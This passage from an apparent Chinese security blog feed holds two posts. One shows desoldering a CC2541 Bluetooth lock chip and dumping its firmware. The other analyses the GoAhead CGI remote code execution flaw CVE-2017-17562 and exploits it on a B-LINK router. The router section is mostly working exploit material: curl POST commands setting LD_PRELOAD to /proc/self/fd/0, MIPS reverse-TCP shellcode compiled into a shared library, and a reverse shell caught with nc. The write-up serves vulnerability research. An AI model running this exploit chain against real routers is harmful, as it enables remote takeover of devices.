-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>芯片安全是针对芯片本身的安全研究，其在知识产权保护，防抄板山寨、加密破解、优化设计、漏洞挖掘和芯片木马等方面都具有深远意义，传统安全往往着眼于上层应用和驱动层面的安全，然而如果芯片存在本质的设计缺陷或安全漏洞，传统安全手段往往很难触及底层，前段时间英特尔芯片的“崩溃”（Meltdown）和“幽灵”（Spectre）漏洞，轰动整个世界，造成了巨额的损失，此次漏洞爆发就是因为芯片自身的设计缺陷所导致的，芯片级的安全研究是一项长期而艰难的工作，其是一门涉及多学科多门类的综合性研究，包括：微电子学、计算机科学、数学、物理学、化学、电磁学、光学等等。芯片分析方式主要包括非侵入式、半侵入式、侵入式、侧信道等。本文通过对某款蓝牙锁芯片的处理和固件提取，作为芯片分析的简单实例。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/dfghfghfhg.jpg" alt="dfghfghfhg"></p><h2 id="拆焊"><a href="#拆焊" class="headerlink" title="拆焊"></a>拆焊</h2><p>在PCB背面有一颗CC2541的蓝牙芯片，此款芯片采用QFN-40封装格式，没有暴露的可以直连外部引脚，厂商在量产时也把调试接口去掉了，为了获取芯片的固件内容，需要进行拆焊。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/fghgjty555.jpg" alt="fghgjty555"></p><p>拆焊所需工具包括：热风枪、焊枪、松香水、吸锡线、洗板水或无水酒精、无纺布、镊子等。热风枪温度调到360度，风速在5档左右，先在距离PCb上方3到5厘米处，给PCB预热几秒，然后缓缓下移到1厘米处，沿着芯片的四周匀速转动，枪口务必不要对准芯片的中心处，防止芯片过热，造成损毁，大概20秒左右即可融化芯片底部焊锡，另一只手用镊子夹住芯片，轻轻往上一提，芯片即可从PCB取下。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134552.jpg" alt="20180116_134552"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134549.jpg" alt="20180116_134549"></p><h2 id="清洁"><a href="#清洁" class="headerlink" title="清洁"></a>清洁</h2><p>取下芯片之后，芯片的底部会粘有很多未去除的焊锡和脏物，需要进一步清洁处理，首先滴上松香水，用焊枪使焊锡融化。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134618.jpg" alt="20180116_134618"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134719.jpg" alt="20180116_134719"></p><p>然后用吸锡线配合焊枪把多余的焊锡和脏物吸掉，反复几次。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134735.jpg" alt="20180116_134735"></p><p>处理完毕之后，用洗板水和无纺布擦洗芯片，彻底去除脏物残留，引脚应保持光亮，以防接触不良和短路。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134815.jpg" alt="20180116_134815"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134845.jpg" alt="20180116_134845"></p><p>焊锡、松香水和洗板水气味比较刺鼻，高温易伤手，工作环境需要注意通风，有条件可以配置防护服。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28.jpg" alt="breaking-bad-heisenberg-jesse-hazmat-suit-combo-sixth-scale-threezero-902883-28"></p><h2 id="芯片读取"><a href="#芯片读取" class="headerlink" title="芯片读取"></a>芯片读取</h2><p>CC2541芯片是TI出品的一款蓝牙芯片，TI有专门的工具和软件来读取，包括：CCDebugger调试器和SmartRF Flash Programmer软件，因芯片已经拆下，可以通过转接板或烧录座连接芯片，引出相应的接口，然后连接CCDebugger进行固件的读取。</p><p>把处理好的芯片放入烧录座，需要正确放置芯片，可以通过芯片正面的小圆点确定方向。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_134912.jpg" alt="20180116_134912"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135324.jpg" alt="20180116_135324"></p><p>确认无误之后，压紧烧录座盖，连上CCDebugger。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116_135403.jpg" alt="20180116_135403"></p><p>打开SmartRF Flash Programmer，选择Read flash into hex-file选项，在Flash image选项可以选择保存的路径和文件名，然后点Perform actions，即可开始读取。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135409.jpg" alt="QQ截图20180116135409"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135434.jpg" alt="QQ截图20180116135434"></p><p>读取的文件格式为HEX，然后根据对应的CPU指令编写进行反汇编。   </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/78B82770-AB46-4404-B195-2B28835DF2AC.jpg" alt="QQ截图20180116135452"></p><p>部分芯片另需进行开片和晶体电路修改等等深度处理，本文是伏宸实验室关于芯片安全的一篇先导性文章，后续将会有一系列关于芯片安全的文章，敬请期待。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h2 id=&quot;前言-1&quot;&gt;&lt;a href=&quot;#前言-1&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p
-      
-    
-    </summary>
-    
-      <category term="芯片安全" scheme="http://yaseng.org/categories/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="芯片安全" scheme="http://yaseng.org/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战</title>
-    <link href="http://yaseng.org/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html"/>
-    <id>http://yaseng.org/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html</id>
-    <published>2017-12-25T16:00:00.000Z</published>
-    <updated>2018-06-29T10:28:29.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>   这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816099569.jpg" alt=""></p><p>随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816744632.jpg" alt=""></p><p>查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137935699186.jpg" alt=""></p><p>在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。<br>如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="调试设备"><a href="#调试设备" class="headerlink" title="调试设备"></a>调试设备</h3><p>为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/IMG_2461.jpg" alt="IMG_2461"></p><p>查看web server 是否 goahead 并且有cgi程序。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/debug.jpg" alt="debug"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆）</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137864957443.jpg" alt=""></p><p>此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pentest@ubuntu:~/buildroot$ cat   mipsel-hw.c</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    write(1, &quot;Hello: World!\n&quot;, 14);</span><br><span class="line">&#125;</span><br><span class="line">pentest@ubuntu:~/buildroot$ ./mipsel-linux-gcc -shared -fPIC  mipsel-hw.c -o mipsel-hw.so</span><br><span class="line">pentest@ubuntu:~/buildroot$ file mipsel-hw.so</span><br><span class="line">mipsel-hw.so: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, not stripped</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST   -b  &quot;user=admin;platform=0&quot;  --data-binary @payloads/mipsel-hw.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 -i</span><br></pre></td></tr></table></figure><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137866081821.jpg" alt=""></p><p>回显成功，说明漏洞存在。</p><h3 id="生成-payload"><a href="#生成-payload" class="headerlink" title="生成 payload"></a>生成 payload</h3><p>使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137880896364.jpg" alt=""></p><p>写入动态链接库中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char sc[] = &#123;</span><br><span class="line">    &quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04&quot;</span><br><span class="line">    &quot;\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20&quot;</span><br><span class="line">    &quot;\x80\x01\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27&quot;</span><br><span class="line">    &quot;\x20\x80\x01\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24&quot;</span><br><span class="line">    &quot;\x0c\x09\x09\x01\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09&quot;</span><br><span class="line">    &quot;\x01\xc9\x0f\x02\x24\x0c\x09\x09\x01\x15\xb3\x05\x3c\x02\x00&quot;</span><br><span class="line">    &quot;\xa5\x34\xf8\xff\xa5\xaf\x10\x67\x05\x3c\xc0\xa8\xa5\x34\xfc&quot;</span><br><span class="line">    &quot;\xff\xa5\xaf\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01&quot;</span><br><span class="line">    &quot;\x4a\x10\x02\x24\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08&quot;</span><br><span class="line">    &quot;\x35\xec\xff\xa8\xaf\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff&quot;</span><br><span class="line">    &quot;\xa8\xaf\xff\xff\x07\x28\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec&quot;</span><br><span class="line">    &quot;\xff\xa4\x23\xec\xff\xa8\x23\xf8\xff\xa8\xaf\xf8\xff\xa5\x23&quot;</span><br><span class="line">    &quot;\xec\xff\xbd\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x09\x09&quot;</span><br><span class="line">    &quot;\x01&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void(*s)(void);</span><br><span class="line">    s = sc;</span><br><span class="line">    s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Buildroot编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mipsel-linux-gcc -shared -fPIC mipsel-reverse-tcp.c -o mipsel-reverse-tcp.so</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地 nc 监听 5555 端口，把生成的so文件post到目标</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST   -b  &quot;user=admin;platform=0&quot;  --data-binary @payloads/mipsel-reverse-tcp.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0</span><br></pre></td></tr></table></figure><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137897078140.jpg" alt=""></p><p>成功反弹shell<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137898902411.jpg" alt=""></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。</li><li>如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>Remote LD_PRELOAD Exploitation   <a href="https://www.elttam.com.au/blog/goahead" target="_blank" rel="noopener">https://www.elttam.com.au/blog/goahead</a></li><li>routesplite  <a href="https://github.com/reverse-shell/routersploit" target="_blank" rel="noopener">https://github.com/reverse-shell/routersploit</a></li><li>硬件调试  <a href="http://future-sec.com/iot-security-hardware-debuging.html" target="_blank" rel="noopener">http://future-sec.com/iot-security-hardware-debuging.html</a></li></ol>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要
-      
-    
-    </summary>
-    
-      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="goahead" scheme="http://yaseng.org/tags/goahead/"/>
     
   </entry>
   
